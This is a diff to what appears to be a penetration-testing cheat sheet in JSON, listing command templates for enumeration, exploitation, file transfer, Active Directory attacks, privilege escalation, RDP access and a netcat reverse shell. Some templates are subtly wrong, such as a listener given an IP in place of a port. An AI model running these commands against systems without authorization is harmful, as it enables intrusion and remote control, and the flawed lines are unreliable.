@@ -1,15 +1,30 @@
 {
     "Enumeration": [
-        "nmap -sC -sV -oA scan {TARGET_IP}",
-        "enum4linux -a {TARGET_IP}"
+        "nmap -sC -sV -oA scan {IP}",
+        "enum4linux -a {IP}",
+        "smbclient -L //{IP}"
+    ],
+    "Exploitation": [
+        "searchsploit {IP}",
+        "msfconsole",
+        "nc -lvnp {IP}"
     ],
     "File Transfer": [
-        "wget http://{TARGET_IP}/file.txt",
-        "scp file.txt {USERNAME}@{TARGET_IP}:/tmp/"
+        "wget http://{IP}/file.txt",
+        "scp file.txt {USERNAME}@{IP}:/tmp/",
+        "python3 -m http.server 8000"
     ],
     "Active Directory Attacks": [
-        "crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD}",
-        "bloodhound-python -c All -u {USERNAME} -p {PASSWORD} -d domain.local -dc-ip {TARGET_IP}"
+        "crackmapexec smb {IP} -u {USERNAME} -p {PASSWORD}",
+        "bloodhound-python -c All -u {USERNAME} -p {PASSWORD} -d domain.local -dc-ip {IP}"
+    ],
+    "Privilege Escalation": [
+        "sudo -l",
+        "find / -perm -4000 -type f 2>/dev/null",
+        "getcap -r / 2>/dev/null"
+    ],
+    "Remote Access": [
+        "xfreerdp /u:{USERNAME} /p:{PASSWORD} /t:{IP} --dns-server"
     ],
     "Reverse Shells": [
         "nc -e /bin/sh {TARGET_IP} {SOURCE_IP}",
